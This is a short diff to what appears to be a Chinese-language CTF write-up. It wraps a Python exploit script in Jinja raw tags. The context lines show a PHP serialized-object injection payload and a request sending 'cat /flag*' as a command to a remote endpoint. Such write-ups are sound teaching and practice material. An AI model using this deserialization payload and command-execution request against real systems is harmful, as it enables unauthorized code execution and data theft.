@@ -482,6 +482,7 @@ a:2:{i:0;O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:114:"O:1:"A":2:{s:27:"__
 
 用 Python 发送请求的完整脚本：
 
+{% raw %}
 ```python
 import requests
 
@@ -497,6 +498,7 @@ r = requests.post(url, params={'cmd': 'cat /flag*'}, data={'user': payload})
 
 print(r.text)
 ```
+{% endraw %}
 
 **关键说明**：
 
